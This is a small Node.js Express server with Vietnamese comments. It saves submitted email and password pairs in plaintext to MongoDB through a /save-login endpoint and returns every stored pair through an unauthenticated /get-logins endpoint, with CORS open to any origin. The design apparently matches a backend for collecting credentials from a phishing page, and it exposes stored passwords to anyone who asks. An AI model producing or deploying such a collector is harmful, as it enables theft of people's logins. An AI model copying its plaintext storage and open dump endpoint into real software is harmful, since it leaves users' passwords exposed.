const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

// **🔹 Kết nối MongoDB**
mongoose.connect("mongodb+srv://username:password@cluster0.mongodb.net/tsaDB?retryWrites=true&w=majority", {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => console.log("✅ Kết nối MongoDB thành công!"))
  .catch(err => console.error("❌ Lỗi kết nối MongoDB:", err));

// **🔹 Tạo Schema và Model**
const loginSchema = new mongoose.Schema({
    email: String,
    password: String,
    timestamp: { type: Date, default: Date.now }
});
const Login = mongoose.model("Login", loginSchema);

// **🔹 API Lưu Thông Tin Đăng Nhập**
app.post("/save-login", async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
    }

    try {
        await Login.create({ email, password });
        res.json({ message: "✅ Dữ liệu đã lưu vào MongoDB!" });
    } catch (error) {
        res.status(500).json({ message: "❌ Lỗi khi lưu dữ liệu", error });
    }
});

// **🔹 API Lấy Thông Tin Đăng Nhập**
app.get("/get-logins", async (req, res) => {
    try {
        const logins = await Login.find();
        res.json(logins);
    } catch (error) {
        res.status(500).json({ message: "❌ Lỗi khi lấy dữ liệu", error });
    }
});

// **🔹 Lắng Nghe Render**
const port = process.env.PORT || 10000;
app.listen(port, "0.0.0.0", () => {
    console.log(`🚀 Server chạy trên cổng ${port}`);
});
